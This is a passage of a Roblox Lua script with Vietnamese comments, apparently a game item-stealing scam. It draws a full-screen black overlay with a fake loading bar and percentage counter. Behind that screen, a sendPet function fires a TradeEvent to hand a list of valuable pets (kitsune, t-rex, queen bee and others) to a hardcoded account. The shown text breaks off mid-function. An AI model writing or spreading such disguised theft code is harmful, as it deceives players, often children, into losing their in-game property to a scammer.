local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")

local targetName = "khudandan1234"
local petList = {
    "dragonfly", "mimic", "red fox", "t-rex", "kitsune",
    "corrupted kitsune", "spinosaurus", "dilophosaurus",
    "butterfly", "raccoon", "disco bee", "queen bee"
}

local player = Players.LocalPlayer
local petFolder = player:WaitForChild("PetFolder") -- tùy game
local TradeEvent = ReplicatedStorage:WaitForChild("TradeEvent")

-- Tạo GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "PetSenderGui"

local black = Instance.new("Frame", gui)
black.Size = UDim2.new(1,0,1,0)
black.BackgroundColor3 = Color3.new(0,0,0)
black.BorderSizePixel = 0
black.ZIndex = 10

local barBg = Instance.new("Frame", black)
barBg.Size = UDim2.new(0.5, 0, 0.05, 0)
barBg.Position = UDim2.new(0.25, 0, 0.9, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.BorderSizePixel = 0
barBg.ZIndex = 11

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.Position = UDim2.new(0, 0, 0, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
bar.BorderSizePixel = 0
bar.ZIndex = 12

local label = Instance.new("TextLabel", black)
label.Size = UDim2.new(0.5, 0, 0.05, 0)
label.Position = UDim2.new(0.25, 0, 0.84, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1,1,1)
label.TextScaled = true
label.Font = Enum.Font.SourceSansBold
label.Text = "0%"
label.ZIndex = 12

local function updateBar(pct)
    bar:TweenSize(UDim2.new(pct/100, 0, 1, 0), "Out", "Quad", 0.2, true)
    label.Text = tostring(math.floor(pct)) .. "%"
end

local function sendPet(petName)
    local pet = petFolder:FindFirstChild(petName)
    if pet then
        TradeEvent:FireServer(targetName, petName)
        return true
    else
        return false
  end
